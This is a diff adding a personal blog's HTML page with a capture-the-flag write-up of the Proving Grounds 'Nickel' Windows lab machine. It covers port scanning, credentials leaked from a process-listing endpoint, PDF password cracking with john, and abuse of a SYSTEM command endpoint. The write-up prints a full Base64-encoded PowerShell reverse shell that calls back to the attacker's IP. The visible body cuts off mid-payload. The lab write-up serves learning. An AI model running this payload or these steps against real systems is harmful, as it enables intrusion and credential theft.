@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>PG Practice - Nickel | Fabio Birnegger</title>
+<meta name="keywords" content="Proving Grounds Practice, Windows, Write-Up">
+<meta name="description" content="Box Details
+
+  
+      
+          
+          
+      
+  
+  
+      
+          Difficulty
+          Intermediate
+      
+      
+          Type
+          Windows
+      
+  
+
+Port Scan
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           FileZilla ftpd 0.9.60 beta
+| ftp-syst: 
+|_  SYST: UNIX emulated by FileZilla
+22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
+|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
+|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: NICKEL
+|   NetBIOS_Domain_Name: NICKEL
+|   NetBIOS_Computer_Name: NICKEL
+|   DNS_Domain_Name: nickel
+|   DNS_Computer_Name: nickel
+|   Product_Version: 10.0.18362
+|_  System_Time: 2026-06-25T17:41:51&#43;00:00
+| ssl-cert: Subject: commonName=nickel
+| Not valid before: 2026-06-24T17:34:11
+|_Not valid after:  2026-12-24T17:34:11
+|_ssl-date: 2026-06-25T17:42:55&#43;00:00; &#43;1s from scanner time.
+5040/tcp  open  unknown
+8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Site doesn&#39;t have a title.
+|_http-server-header: Microsoft-HTTPAPI/2.0
+33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Site doesn&#39;t have a title.
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+Local
+There is a webserver running on port 33333 which says Invalid Token when accessing it:">
+<meta name="author" content="Fabio Birnegger">
+<link rel="canonical" href="http://localhost:1313/writeups/pg_nickel/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.b255db539a50b81cdf98f8e589f90be96d438cc741249f7e8f6510cff8a616fd.css" integrity="sha256-slXbU5pQuBzfmPjlifkL6W1DjMdBJJ9&#43;j2UQz/imFv0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/pg_nickel/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/writeups/pg_nickel/">
+  <meta property="og:site_name" content="Fabio Birnegger">
+  <meta property="og:title" content="PG Practice - Nickel">
+  <meta property="og:description" content="Box Details
+Difficulty Intermediate Type Windows Port Scan
+PORT STATE SERVICE VERSION21/tcp open ftp FileZilla ftpd 0.9.60 beta| ftp-syst: |_ SYST: UNIX emulated by FileZilla22/tcp open ssh OpenSSH for_Windows_8.1 (protocol 2.0)| ssh-hostkey: | 3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)| 256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)|_ 256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?3389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: | Target_Name: NICKEL| NetBIOS_Domain_Name: NICKEL| NetBIOS_Computer_Name: NICKEL| DNS_Domain_Name: nickel| DNS_Computer_Name: nickel| Product_Version: 10.0.18362|_ System_Time: 2026-06-25T17:41:51&#43;00:00| ssl-cert: Subject: commonName=nickel| Not valid before: 2026-06-24T17:34:11|_Not valid after: 2026-12-24T17:34:11|_ssl-date: 2026-06-25T17:42:55&#43;00:00; &#43;1s from scanner time.5040/tcp open unknown8089/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Site doesn&#39;t have a title.|_http-server-header: Microsoft-HTTPAPI/2.033333/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Site doesn&#39;t have a title.49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windows Local There is a webserver running on port 33333 which says Invalid Token when accessing it:">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-06-23T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-06-23T00:00:00+00:00">
+    <meta property="article:tag" content="Proving Grounds Practice">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Write-Up">
+    <meta property="og:image" content="http://localhost:1313/writeups/pg_nickel/images/writeup_screens/pg_nickel/pg_nickel_cover.svg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://localhost:1313/writeups/pg_nickel/images/writeup_screens/pg_nickel/pg_nickel_cover.svg">
+  <meta name="twitter:title" content="PG Practice - Nickel">
+  <meta name="twitter:description" content="Box Details
+Difficulty Intermediate Type Windows Port Scan
+PORT STATE SERVICE VERSION21/tcp open ftp FileZilla ftpd 0.9.60 beta| ftp-syst: |_ SYST: UNIX emulated by FileZilla22/tcp open ssh OpenSSH for_Windows_8.1 (protocol 2.0)| ssh-hostkey: | 3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)| 256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)|_ 256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?3389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: | Target_Name: NICKEL| NetBIOS_Domain_Name: NICKEL| NetBIOS_Computer_Name: NICKEL| DNS_Domain_Name: nickel| DNS_Computer_Name: nickel| Product_Version: 10.0.18362|_ System_Time: 2026-06-25T17:41:51&#43;00:00| ssl-cert: Subject: commonName=nickel| Not valid before: 2026-06-24T17:34:11|_Not valid after: 2026-12-24T17:34:11|_ssl-date: 2026-06-25T17:42:55&#43;00:00; &#43;1s from scanner time.5040/tcp open unknown8089/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Site doesn&#39;t have a title.|_http-server-header: Microsoft-HTTPAPI/2.033333/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Site doesn&#39;t have a title.49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windows Local There is a webserver running on port 33333 which says Invalid Token when accessing it:">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "http://localhost:1313/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "PG Practice - Nickel",
+      "item": "http://localhost:1313/writeups/pg_nickel/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PG Practice - Nickel",
+  "name": "PG Practice - Nickel",
+  "description": "Box Details\nDifficulty Intermediate Type Windows Port Scan\nPORT STATE SERVICE VERSION\r21/tcp open ftp FileZilla ftpd 0.9.60 beta\r| ftp-syst: |_ SYST: UNIX emulated by FileZilla\r22/tcp open ssh OpenSSH for_Windows_8.1 (protocol 2.0)\r| ssh-hostkey: | 3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)\r| 256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)\r|_ 256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r445/tcp open microsoft-ds?\r3389/tcp open ms-wbt-server Microsoft Terminal Services\r| rdp-ntlm-info: | Target_Name: NICKEL\r| NetBIOS_Domain_Name: NICKEL\r| NetBIOS_Computer_Name: NICKEL\r| DNS_Domain_Name: nickel\r| DNS_Computer_Name: nickel\r| Product_Version: 10.0.18362\r|_ System_Time: 2026-06-25T17:41:51+00:00\r| ssl-cert: Subject: commonName=nickel\r| Not valid before: 2026-06-24T17:34:11\r|_Not valid after: 2026-12-24T17:34:11\r|_ssl-date: 2026-06-25T17:42:55+00:00; +1s from scanner time.\r5040/tcp open unknown\r8089/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-title: Site doesn\u0026#39;t have a title.\r|_http-server-header: Microsoft-HTTPAPI/2.0\r33333/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-server-header: Microsoft-HTTPAPI/2.0\r|_http-title: Site doesn\u0026#39;t have a title.\r49664/tcp open msrpc Microsoft Windows RPC\r49665/tcp open msrpc Microsoft Windows RPC\r49666/tcp open msrpc Microsoft Windows RPC\r49667/tcp open msrpc Microsoft Windows RPC\r49668/tcp open msrpc Microsoft Windows RPC\r49669/tcp open msrpc Microsoft Windows RPC\rService Info: OS: Windows; CPE: cpe:/o:microsoft:windows Local There is a webserver running on port 33333 which says Invalid Token when accessing it:\n",
+  "keywords": [
+    "Proving Grounds Practice", "Windows", "Write-Up"
+  ],
+  "articleBody": "Box Details\nDifficulty Intermediate Type Windows Port Scan\nPORT STATE SERVICE VERSION\r21/tcp open ftp FileZilla ftpd 0.9.60 beta\r| ftp-syst: |_ SYST: UNIX emulated by FileZilla\r22/tcp open ssh OpenSSH for_Windows_8.1 (protocol 2.0)\r| ssh-hostkey: | 3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)\r| 256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)\r|_ 256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r445/tcp open microsoft-ds?\r3389/tcp open ms-wbt-server Microsoft Terminal Services\r| rdp-ntlm-info: | Target_Name: NICKEL\r| NetBIOS_Domain_Name: NICKEL\r| NetBIOS_Computer_Name: NICKEL\r| DNS_Domain_Name: nickel\r| DNS_Computer_Name: nickel\r| Product_Version: 10.0.18362\r|_ System_Time: 2026-06-25T17:41:51+00:00\r| ssl-cert: Subject: commonName=nickel\r| Not valid before: 2026-06-24T17:34:11\r|_Not valid after: 2026-12-24T17:34:11\r|_ssl-date: 2026-06-25T17:42:55+00:00; +1s from scanner time.\r5040/tcp open unknown\r8089/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-title: Site doesn't have a title.\r|_http-server-header: Microsoft-HTTPAPI/2.0\r33333/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\r|_http-server-header: Microsoft-HTTPAPI/2.0\r|_http-title: Site doesn't have a title.\r49664/tcp open msrpc Microsoft Windows RPC\r49665/tcp open msrpc Microsoft Windows RPC\r49666/tcp open msrpc Microsoft Windows RPC\r49667/tcp open msrpc Microsoft Windows RPC\r49668/tcp open msrpc Microsoft Windows RPC\r49669/tcp open msrpc Microsoft Windows RPC\rService Info: OS: Windows; CPE: cpe:/o:microsoft:windows Local There is a webserver running on port 33333 which says Invalid Token when accessing it:\nThis doesn’t seem interesting right now so we go on analyzing the other running webserver on port 8089:\nIf we click on any of the three buttons the application tries to redirect us to a public IP on port 33333:\nIf we look at the HTML Code we can see that the IP/Port as well as the respective endpoint names are hardcoded in the action parameters:\nWe are obviously not getting any response on the redirect here. What’s interesting is the port number. As we have seen before the specific port 33333 is open on the target as well. This is why I tried to send a request to one of those endpoints but on our target instead:\nThe response implies that the endpoint is there but we are using the wrong HTTP method. So I tried to send a POST Request instead. This time it worked and I received the running processes of the target machine as response. I was able to identify a running cmd.exe process with a start command that reveals clear-text credentials in the list:\nariah:Tm93aXNlU2xvb3BUaGVvcnkxMzkK In the process command we can find the parameter --protocol ssh. Thats why I tried to use these credentials for a SSH connection which wasn’t successful.\nThe password looked weird to me so I pasted it into CyberChef and used the magic wand function which revealed that this is a Base64 encoded string and can be decoded to NowiseSloopTheory139. With the actual password i was able to connect to the target via SSH with the user ariah. We can now read C:\\Users\\ariah\\Desktop\\local.txt.\nProof While enumerating the machine I came across the file C:/ftp/Infrastructure.pdf. This sounds interesting so i downloaded it with the following command:\n└─$ scp ariah@192.168.118.99:\"C:/ftp/Infrastructure.pdf\" ./ I tried to open the PDF locally but it is password protected. I extracted the hash from the file with:\n└─$ pdf2john Infrastructure.pdf I copy\u0026pasted the output in a file infrahash.txt and tried to crack it with john:\n└─$ john --format=PDF --wordlist=/usr/share/wordlists/rockyou.txt infrahash.txt After a few seconds I cracked the password: ariah4168\nWith this clear-text password I was able to read the PDF files contents:\nInfrastructure Notes\rTemporary Command endpoint: http://nickel/?\rBackup system: http://nickel-backup/backup\rNAS: http://corp-nas/file The “Temporary Command endpoint” catched my eye because there is always a possibilty we can execute commands with different privileges. We cannot try it out right away because nickel is not a valid hostname. I suspected that nickel just stands for a local webserver so I looked at the open connections with \u003e netstat -ano and saw there is indeed a local webserver running.\nI then tried to access the Temporary Command endpoint URL on localhost and was able to execute commands as SYSTEM user:\nAfterwards I just had to create a netcat listener, generate a Base64 encoded powershell reverse shell command, URL encode it and send it as a GET parameter to the endpoint:\nPS C:\\\u003e Invoke-WebRequest http://localhost/?powershell%20%2De%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA5\rACIALAA1ADUANQA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0A\rLgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBF\rAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0A\rIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBu\rAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA== -UseBas\ricParsing | Select-Object -Expand RawContent Shortly after I received a SYSTEM reverse shell and was able to read C:\\users\\administrator\\desktop\\proof.txt.\n",
+  "wordCount" : "712",
+  "inLanguage": "en",
+  "image":"http://localhost:1313/writeups/pg_nickel/images/writeup_screens/pg_nickel/pg_nickel_cover.svg","datePublished": "2026-06-23T00:00:00Z",
+  "dateModified": "2026-06-23T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Fabio Birnegger"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/writeups/pg_nickel/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Fabio Birnegger",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Fabio Birnegger (Alt + H)">Fabio Birnegger</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/writeups/" title="Write-ups">
+                    <span>Write-ups</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/publications/" title="Publications &amp; Talks">
+                    <span>Publications &amp; Talks</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="whoami">
+                    <span>whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      PG Practice - Nickel
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-06-23 00:00:00 +0000 UTC'>June 23, 2026</span>&nbsp;·&nbsp;<span>4 min</span>&nbsp;·&nbsp;<span>Fabio Birnegger</span>
+
+</div>
+  </header> 
+<figure class="entry-cover">
+        <img loading="eager" src="http://localhost:1313/images/writeup_screens/pg_nickel/pg_nickel_cover.svg" alt="Cover">
+        
+</figure>
+  <div class="post-content md-content"><p><strong>Box Details</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th></th>
+          <th></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Difficulty</td>
+          <td>Intermediate</td>
+      </tr>
+      <tr>
+          <td>Type</td>
+          <td>Windows</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>Port Scan</strong></p>
+<pre tabindex="0"><code>PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           FileZilla ftpd 0.9.60 beta
+| ftp-syst: 
+|_  SYST: UNIX emulated by FileZilla
+22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
+|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
+|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: NICKEL
+|   NetBIOS_Domain_Name: NICKEL
+|   NetBIOS_Computer_Name: NICKEL
+|   DNS_Domain_Name: nickel
+|   DNS_Computer_Name: nickel
+|   Product_Version: 10.0.18362
+|_  System_Time: 2026-06-25T17:41:51+00:00
+| ssl-cert: Subject: commonName=nickel
+| Not valid before: 2026-06-24T17:34:11
+|_Not valid after:  2026-12-24T17:34:11
+|_ssl-date: 2026-06-25T17:42:55+00:00; +1s from scanner time.
+5040/tcp  open  unknown
+8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Site doesn&#39;t have a title.
+|_http-server-header: Microsoft-HTTPAPI/2.0
+33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Site doesn&#39;t have a title.
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre><h2 id="local">Local<a hidden class="anchor" aria-hidden="true" href="#local">#</a></h2>
+<p>There is a webserver running on port <strong>33333</strong> which says <em>Invalid Token</em> when accessing it:</p>
+<p><img loading="lazy" src="/images/writeup_screens/pg_nickel/pg_nickel1.png"></p>
+<p>This doesn&rsquo;t seem interesting right now so we go on analyzing the other running webserver on port <strong>8089</strong>:</p>
+<p><img loading="lazy" src="/images/writeup_screens/pg_nickel/pg_nickel2.png"></p>
+<p>If we click on any of the three buttons the application tries to redirect us to a public IP on port <strong>33333</strong>:</p>
+<p><img loading="lazy" src="/images/writeup_screens/pg_nickel/pg_nickel3.png"></p>
+<p>If we look at the HTML Code we can see that the IP/Port as well as the respective endpoint names are hardcoded in the <em>action</em> parameters:</p>
+<p><img loading="lazy" src="/images/writeup_screens/pg_nickel/pg_nickel8.png"></p>
+<p>We are obviously not getting any response on the redirect here. What&rsquo;s interesting is the port number. As we have seen before the specific port <strong>33333</strong> is open on the target as well. This is why I tried to send a request to one of those endpoints but on our target instead:</p>
+<p><img loading="lazy" src="/images/writeup_screens/pg_nickel/pg_nickel4.png"></p>
+<p>The response implies that the endpoint is there but we are using the wrong HTTP method. So I tried to send a POST Request instead. This time it worked and I received the running processes of the target machine as response. I was able to identify a running <strong>cmd.exe</strong> process with a start command that reveals clear-text credentials in the list:</p>
+<p><img loading="lazy" src="/images/writeup_screens/pg_nickel/pg_nickel5.png"></p>
+<pre tabindex="0"><code>ariah:Tm93aXNlU2xvb3BUaGVvcnkxMzkK
+</code></pre><p>In the process command we can find the parameter <code>--protocol ssh</code>. Thats why I tried to use these credentials for a SSH connection which wasn&rsquo;t successful.</p>
+<p>The password looked weird to me so I pasted it into <a href="https://gchq.github.io/CyberChef/">CyberChef</a> and used the magic wand function which revealed that this is a <strong>Base64</strong> encoded string and can be decoded to <code>NowiseSloopTheory139</code>. With the actual password i was able to connect to the target via SSH with the user <strong>ariah</strong>. We can now read <em>C:\Users\ariah\Desktop\local.txt</em>.</p>
+<h2 id="proof">Proof<a hidden class="anchor" aria-hidden="true" href="#proof">#</a></h2>
+<p>While enumerating the machine I came across the file <em>C:/ftp/Infrastructure.pdf</em>. This sounds interesting so i downloaded it with the following command:</p>
+<pre tabindex="0"><code>└─$ scp ariah@192.168.118.99:&#34;C:/ftp/Infrastructure.pdf&#34; ./
+</code></pre><p>I tried to open the PDF locally but it is password protected. I extracted the hash from the file with:</p>
+<pre tabindex="0"><code>└─$ pdf2john Infrastructure.pdf 
+</code></pre><p>I copy&amp;pasted the output in a file <em>infrahash.txt</em> and tried to crack it with john:</p>
+<pre tabindex="0"><code>└─$ john --format=PDF --wordlist=/usr/share/wordlists/rockyou.txt infrahash.txt
+</code></pre><p>After a few seconds I cracked the password: <em>ariah4168</em></p>
+<p>With this clear-text password I was able to read the PDF files contents:</p>
+<pre tabindex="0"><code>Infrastructure Notes
+
+Temporary Command endpoint: http://nickel/?
+Backup system: http://nickel-backup/backup
+NAS: http://corp-nas/file
+</code></pre><p>The &ldquo;Temporary Command endpoint&rdquo; catched my eye because there is always a possibilty we can execute commands with different privileges. We cannot try it out right away because <em>nickel</em> is not a valid hostname. I suspected that <em>nickel</em> just stands for a local webserver so I looked at the open connections with <code>&gt; netstat -ano</code> and saw there is indeed a local webserver running.</p>
+<p><img loading="lazy" src="/images/writeup_screens/pg_nickel/pg_nickel6.png"></p>
+<p>I then tried to access the Temporary Command endpoint URL on localhost and was able to execute commands as <em>SYSTEM</em> user:</p>
+<p><img loading="lazy" src="/images/writeup_screens/pg_nickel/pg_nickel7.png"></p>
+<p>Afterwards I just had to create a netcat listener, generate a Base64 encoded powershell reverse shell command, URL encode it and send it as a GET parameter to the endpoint:</p>
+<pre tabindex="0"><code>PS C:\&gt; Invoke-WebRequest http://localhost/?powershell%20%2De%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA5
+ACIALAA1ADUANQA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0A
+LgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBF
+AG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0A
